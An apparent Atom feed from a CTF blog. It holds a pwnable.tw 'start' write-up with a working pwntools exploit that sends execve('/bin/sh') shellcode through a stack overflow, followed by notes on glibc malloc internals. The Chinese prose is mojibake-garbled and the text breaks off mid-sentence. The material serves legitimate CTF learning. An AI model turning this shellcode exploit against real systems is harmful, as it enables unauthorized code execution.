<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2023-03-20T13:49:16.509Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwnable.kråˆ·é¢˜è®°å½•-1</title>
    <link href="https://ixout.github.io/posts/4569/"/>
    <id>https://ixout.github.io/posts/4569/</id>
    <published>2023-03-20T13:46:51.000Z</published>
    <updated>2023-03-20T13:49:16.509Z</updated>
    
    
    <summary type="html">æ¯”twç®€å•ä¸€ç‚¹</summary>
    
    
    
    <category term="write up" scheme="https://ixout.github.io/categories/write-up/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="pwnable.kr" scheme="https://ixout.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.twåˆ·é¢˜è®°å½•-1</title>
    <link href="https://ixout.github.io/posts/10836/"/>
    <id>https://ixout.github.io/posts/10836/</id>
    <published>2023-03-20T01:01:55.000Z</published>
    <updated>2023-03-20T06:36:03.472Z</updated>
    
    <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>ç¬¬ä¸€æ­¥æ£€æŸ¥ä¿æŠ¤,æ˜¯ä¹…è¿çš„æ„Ÿè§‰ğŸ˜‚</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_082554.png" alt=""></p><hr><p>idaæ‰“å¼€çœ‹çœ‹</p><p>ä¸éš¾å‘ç°å…¶ä¸æ˜¯æ ‡å‡†æ ˆå¸§ç»“æ„,ğŸ”’ä»¥idaåæ±‡ç¼–ä¸äº†(ç™¾åº¦å¯ä»¥æœç´¢è§£å†³åŠæ³•),å¥½åœ¨ä¸é•¿ç›´æ¥çœ‹æ±‡ç¼–ä»£ç å§.</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_091524.png" alt=""></p><p>ç¨‹åºä¸»ä½“æ˜¯ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨readå’Œwrite,å…¶ä¸­readè¯»å–60ä¸ªå­—èŠ‚æ˜æ˜¾æœ‰æº¢å‡º,ä½†è¦æ€ä¹ˆåˆ©ç”¨æ˜¯å…³é”®</p><p>é¦–é€‰è‡ªç„¶æ˜¯ret2shellcodeäº†,ä½†ret2shellcodeéœ€è¦æ ˆåœ°å€,å¯ä»¥çœ‹åˆ°ç¨‹åºèµ·å§‹æœ‰å‘æ ˆä¸­å‹å…¥esp,æˆ‘ä»¬å¯ä»¥é€‰æ‹©å€Ÿç”¨writeç³»ç»Ÿè°ƒç”¨å°†å…¶æ³„éœ²,å‰©ä¸‹çš„å°±æ˜¯å¸¸è§„æ“ä½œäº†</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))+<span class="number">0x14</span> <span class="comment">#åŠ 14æ˜¯å› ä¸ºæœ€ååˆæŠ¬é«˜äº†espä¸€æ¬¡</span></span><br><span class="line">p.recv()</span><br><span class="line">sh=<span class="string">b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(stack)+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-201.png" alt=""></p><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1>]]></content>
    
    
    <summary type="html">è¿™å°±æ˜¯åœ¨éš¾ä¸ºæˆ‘äº†</summary>
    
    
    
    <category term="write up" scheme="https://ixout.github.io/categories/write-up/"/>
    
    
    <category term="pwnable.tw" scheme="https://ixout.github.io/tags/pwnable-tw/"/>
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="åˆ·é¢˜è®°å½•" scheme="https://ixout.github.io/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>å †å­¦ä¹ ç¬”è®°-2</title>
    <link href="https://ixout.github.io/posts/40023/"/>
    <id>https://ixout.github.io/posts/40023/</id>
    <published>2023-03-18T08:17:28.000Z</published>
    <updated>2023-03-20T06:35:39.234Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç¬¬ä¸€ç¯‡å †å­¦ä¹ ç¬”è®°ä¸»è¦è¿˜æ˜¯åŸºç¡€æ€§çš„çŸ¥è¯†è¦å¤šä¸€ç‚¹ï¼Œåƒmallocå’Œfreeçš„æµç¨‹éƒ½åªæ˜¯è´´äº†å¼ å›¾ï¼Œè¿™ç¯‡æ–‡ç« åˆ™ç¨å¾®æ›´æ·±å…¥ä¸€ç‚¹ç‚¹ã€‚</p><h1 id="æ— tcache"><a href="#æ— tcache" class="headerlink" title="æ— tcache"></a>æ— tcache</h1><h2 id="mallocåˆå§‹åŒ–"><a href="#mallocåˆå§‹åŒ–" class="headerlink" title="mallocåˆå§‹åŒ–"></a>mallocåˆå§‹åŒ–</h2><p>mallocçš„å…¥å£æ˜¯æ˜¯_libc_malloc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* __libc_malloc (<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">  <span class="comment">// First part: callback</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// Second part  </span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// Third part</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä»£ç å¯ä»¥çœ‹å‡ºï¼Œä¸»è¦åŒ…å«<strong>callbackã€arena_getã€_int_malloc</strong>è¿™å‡ æ­¥ï¼Œæˆ‘ä»¬æŠŠ<strong>callbackå’Œarena_getå½“ä½œåˆå§‹åŒ–</strong>çš„è¿‡ç¨‹ï¼Œ_<strong>int_mallocä½œä¸ºå®é™…åˆ†é…</strong>çš„è¿‡ç¨‹ï¼Œæœ¬æ–‡ç€é‡æ¥çœ‹åˆå§‹åŒ–çš„è¿‡ç¨‹ï¼Œä¸‹ç¯‡æ–‡ç« å†çœ‹_int_mallocã€‚</p><p>å†é¢å¤–è¯´ä¸€ä¸‹builtin_expectï¼Œå®ƒæ˜¯gccçš„æ‰©å±•ï¼Œç”¨æ¥å…è®¸ç¨‹åºå‘˜å°†æœ€æœ‰å¯èƒ½æ‰§è¡Œçš„åˆ†æ”¯å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¿™æ ·ç¼–è¯‘å™¨å°±å¯ä»¥å¯¹åˆ†æ”¯é¢„æµ‹åšä¸€äº›ä¼˜åŒ–ï¼Œç®€å•æ¥è®²å°±æ˜¯åœ¨é‡åˆ°åˆ†æ”¯çš„æ—¶å€™ï¼Œå…ˆç”Ÿæˆå¤§æ¦‚ç‡åˆ†æ”¯çš„æŒ‡ä»¤ï¼Œè¿™æ ·æŒ‡ä»¤cacheçš„å‘½ä¸­ç‡ä¼šå˜é«˜ï¼Œå…·ä½“ç»†èŠ‚å¯ä»¥å‚è€ƒgccçš„å®˜æ–¹æ–‡æ¡£ï¼ˆä»¥GCC10.1ä¸ºä¾‹ï¼š<a href="https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtinsï¼‰ï¼Œæœ‰æ—¶ä¹Ÿä¼šå°†__builtin_expectæŒ‡ä»¤å°è£…ä¸ºlikelyå’Œunlikelyå®ï¼Œå®ƒä»¬çš„å®šä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š">https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtinsï¼‰ï¼Œæœ‰æ—¶ä¹Ÿä¼šå°†__builtin_expectæŒ‡ä»¤å°è£…ä¸ºlikelyå’Œunlikelyå®ï¼Œå®ƒä»¬çš„å®šä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __builtin_expect(expr, val) (expr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> likely(expr) __builtin_expect(!!(expr), 1) <span class="comment">//exprå¾ˆå¯èƒ½ä¸ºçœŸ</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlikely(expr) __builtin_expect(!!(expr), 0) <span class="comment">//exprå¾ˆå¯èƒ½ä¸ºå‡</span></span></span><br></pre></td></tr></table></figure><h3 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h3><p>å…ˆçœ‹å‰é¢ä»£ç 1ä¸­çš„first partï¼Œå¦‚ä¸‹ä¸¤å¥ï¼Œç¬¬ä¸€å¥æ˜¯ç»™å‡½æ•°æŒ‡é’ˆå˜é‡èµ‹å€¼ï¼Œç¬¬äºŒå¥æ˜¯å‡½æ•°è°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>hookæ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œè¢«èµ‹å€¼æˆäº†__malloc_hookï¼Œåè€…å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span> = malloc_hook_ini;</span><br></pre></td></tr></table></figure><p>__malloc_hookè¢«åˆå§‹åŒ–æˆäº†malloc_hook_iniï¼Œåè€…å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span> &#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<strong>malloc_hookåˆè¢«èµ‹å€¼æˆäº†NULLï¼Œç„¶åå†é‡æ–°è°ƒç”¨</strong>libc_mallocï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯åœ¨å¤šæ¬¡è°ƒç”¨__libc_mallocçš„æƒ…å†µä¸‹ï¼Œä»£ç 1ä¸­çš„hookå›è°ƒå‡½æ•°åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170117.png" alt=""></p><p>è¿™ä¸ªå‡½æ•°é‡Œçš„ptmalloc_initçš„ç²¾ç®€å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  __malloc_initialized = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line">  malloc_init_state (&amp;main_arena);</span><br><span class="line">  </span><br><span class="line">  __malloc_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é€šè¿‡__malloc_initializedè¿™ä¸ªå…¨å±€flagæ¥æ£€æµ‹æ˜¯ä¸æ˜¯å·²ç»åˆå§‹åŒ–è¿‡äº†ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™æŠŠmain_arenaè®¾æˆå½“å‰çš„thread_arenaï¼Œè¿™æ˜¯å› ä¸ºåˆå§‹åŒ–è‚¯å®šæ˜¯ä¸»çº¿ç¨‹åœ¨åšï¼Œè€Œä¸»çº¿ç¨‹ç”¨çš„æ˜¯main_arenaï¼Œç„¶åå†è°ƒç”¨malloc_init_stateè¿›ä¸€æ­¥åˆå§‹åŒ–ï¼Œmalloc_init_stateå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast(DEFAULT_MXFAST);</span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc_init_stateçš„part1æŠŠmalloc_stateä¸­çš„bins arrayåˆå§‹åŒ–æˆäº†ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170451.png" alt=""></p><p>malloc_init_stateçš„part2æŠŠmalloc_stateä¸­çš„topåˆå§‹åŒ–æˆäº†æŒ‡å‘ä¸Šå›¾2ä¸­çš„bin1ï¼Œä¿®æ”¹topåå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_170512.png" alt=""></p><h3 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h3><p>ä»‹ç©æ„æ˜¯ä¸ªå®,æºä»£ç é‡Œæœ‰ä¸€æ®µè§£é‡Š:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* arena_get() acquires an arena and locks the corresponding mutex.</span></span><br><span class="line"><span class="comment">   First, try the one last locked successfully by this thread.  (This</span></span><br><span class="line"><span class="comment">   is the common case and handled with a macro for speed.)  Then, loop</span></span><br><span class="line"><span class="comment">   once over the circularly linked list of arenas.  If no arena is</span></span><br><span class="line"><span class="comment">   readily available, create a new one.  In this latter case, `size&#x27;</span></span><br><span class="line"><span class="comment">   is just a hint as to how much memory will be required immediately</span></span><br><span class="line"><span class="comment">   in the new arena. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      ptr = thread_arena;      \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (ptr)      \</span></span><br><span class="line"><span class="meta">        __libc_lock_lock (ptr-&gt;mutex);      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">        ptr = arena_get2 ((size), NULL);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>arena_getå¯ä»¥ç²¾ç®€æˆå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123;                \</span></span><br><span class="line"><span class="meta">  ptr = thread_arena;                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ptr) &#123; __libc_lock_lock (ptr-&gt;mutex); &#125;  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; ptr = arena_get2 ((size), NULL); &#125;    \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>å¯è§ä¸»è¦çš„å®ç°åœ¨arena_get2è¿™ä¸ªå‡½æ•°é‡Œï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºå½“å‰çº¿ç¨‹è·å–ä¸€ä¸ªå¯ç”¨çš„arenaï¼Œè¿™ä¸ªå‡½æ•°çš„å®ç°å¾ˆå¤æ‚ï¼Œè€ƒè™‘äº†å„ç§æƒ…å†µï¼Œå‡½æ•°é‡ŒåˆåµŒå¥—è°ƒç”¨äº†å¤šä¸ªå‡½æ•°ï¼Œæˆ‘æŠŠå…³é”®çš„æµç¨‹æ€»ç»“åœ¨ä¸‹å›¾é‡Œï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_171208.png" alt=""></p><p>ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œarena_get2çš„flowé‡Œä¸»è¦è°ƒç”¨äº†get_free_listã€reused_arenaã€_int_new_arenaè¿™ä¸‰ä¸ªå‡½æ•°ï¼Œè¿™é‡Œä¸è¯¦ç»†è®²è§£æ¯ä¸€ä¸ªå‡½æ•°äº†ï¼Œå®ƒä»¬çš„ä½œç”¨ä»å‡½æ•°åå°±å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸‰ä¸ªå‡½æ•°é‡Œé¢_int_new_arenaæ›´é‡è¦ä¸€äº›ï¼Œåé¢ç€é‡è®²ä¸€ä¸‹è¿™ä¸€ä¸ªå‡½æ•°ã€‚</p><h3 id="int-new-arena"><a href="#int-new-arena" class="headerlink" title="_int_new_arena"></a>_int_new_arena</h3><p>è¿™ä¸ªå‡½æ•°å¦‚å‰å›¾æ‰€ç¤ºï¼Œå®ƒæ˜¯ç”¨æ¥åœ¨arenaçš„ä¸ªæ•°è¶…å‡ºé™åˆ¶ä¹‹å‰åˆ›å»ºæ–°çš„arenaçš„ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> mstate _int_new_arena(<span class="type">size_t</span> size) &#123;</span><br><span class="line">  <span class="comment">// ç”¨æŒ‡å®šsizeåˆ›å»ºä¸€ä¸ªæ–°çš„heap_infoå¯¹è±¡</span></span><br><span class="line">  heap_info *h = new_heap(size + (<span class="keyword">sizeof</span>(heap_info) </span><br><span class="line">      + <span class="keyword">sizeof</span>(malloc_state) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœsizeè¿‡å¤§å¯¼è‡´new_heapå¤±è´¥ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªåªåŒ…å«</span></span><br><span class="line">    <span class="comment">// åŸºç¡€æ•°æ®ç»“æ„heap_infoå’Œmalloc_stateçš„å¯¹è±¡</span></span><br><span class="line">    h = new_heap (<span class="keyword">sizeof</span> (heap_info) + <span class="keyword">sizeof</span> (malloc_state) </span><br><span class="line">        + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">    <span class="keyword">if</span> (!h) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–malloc_state</span></span><br><span class="line">  malloc_state *a = h-&gt;ar_ptr = (malloc_state *) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è®¾ç½®malloc_stateä¸­çš„top chunkæŒ‡é’ˆ</span></span><br><span class="line">  <span class="comment">// è®¾ç½®top chunkçš„header</span></span><br><span class="line">  <span class="type">char</span> *ptr = (<span class="type">char</span> *)(a + <span class="number">1</span>);</span><br><span class="line">  top(a) = (mchunkptr)ptr;</span><br><span class="line">  set_head(top(a), (((<span class="type">char</span> *)h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ›´æ–°malloc_stateä¸­çš„nexté“¾è¡¨ï¼ŒæŠŠæ–°å»ºçš„arenaåŠ åˆ°é“¾è¡¨ä¸­</span></span><br><span class="line">  thread_arena = a;</span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å†ç”¨ä¸€å¼ memory layoutçš„å›¾ç¤ºæ¥å±•ç¤ºåˆšåˆ›å»ºè¿‡çš„arenaé•¿ä»€ä¹ˆæ ·å­ï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_192109.png" alt=""></p><p>å‰é¢çš„_int_new_arenaå‡½æ•°ä¸­è°ƒç”¨äº†new_heapè¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯é€šè¿‡mmapå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨æ¥é€šè¿‡æ“ä½œç³»ç»Ÿåˆ†é…ç©ºé—´ï¼Œç²¾ç®€è¿‡çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> heap_info *<span class="title function_">new_heap</span><span class="params">(<span class="type">size_t</span> size, <span class="type">size_t</span> top_pad)</span> &#123;</span><br><span class="line">  <span class="comment">// é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ†é…å†…å­˜</span></span><br><span class="line">  <span class="type">char</span> *p2 = (<span class="type">char</span> *)MMAP(aligned_heap_area, </span><br><span class="line">      HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">  <span class="keyword">if</span> (__mprotect(p2, size, </span><br><span class="line">      mtag_mmap_flags | PROT_READ | PROT_WRITE) != <span class="number">0</span>) &#123;</span><br><span class="line">    __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–heap_infoç»“æ„ä½“</span></span><br><span class="line">  heap_info *h = (heap_info *)p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>è¿˜æ˜¯å…ˆè´´ä¸€ä¸ªæ€»æµç¨‹å›¾:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_161319.png" alt=""></p><h3 id="CASæ“ä½œ"><a href="#CASæ“ä½œ" class="headerlink" title="CASæ“ä½œ"></a>CASæ“ä½œ</h3><p>åœ¨mallocçš„å®ç°ä¸­ï¼Œéœ€è¦é¢‘ç¹çš„æ’å…¥å’Œåˆ é™¤å„ä¸ªbinä¸­çš„chunkï¼Œå¾ˆå¤šåœ°æ–¹ç”¨åˆ°äº†CASæ“ä½œï¼Œå› ä¸ºç”¨çš„æ¯”è¾ƒå¤šï¼Œè¿™é‡Œå…ˆç®€å•ä»‹ç»ä¸€ä¸‹</p><p>CASæ˜¯compare and swapçš„ç¼©å†™ï¼Œå®ƒæ˜¯åŸå­æ“ä½œçš„ä¸€ç§ï¼Œå¯ç”¨äºåœ¨å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­å®ç°ä¸è¢«æ‰“æ–­çš„æ•°æ®äº¤æ¢æ“ä½œï¼Œä»è€Œé¿å…å¤šçº¿ç¨‹åŒæ—¶æ”¹å†™æŸä¸€æ•°æ®æ—¶ç”±äºæ‰§è¡Œé¡ºåºä¸ç¡®å®šæ€§ä»¥åŠä¸­æ–­çš„ä¸å¯é¢„çŸ¥æ€§äº§ç”Ÿçš„æ•°æ®ä¸ä¸€è‡´é—®é¢˜ï¼Œè¯¥æ“ä½œé€šè¿‡å°†å†…å­˜ä¸­çš„å€¼ä¸æŒ‡å®šæ•°æ®è¿›è¡Œæ¯”è¾ƒï¼Œå½“æ•°å€¼ä¸€æ 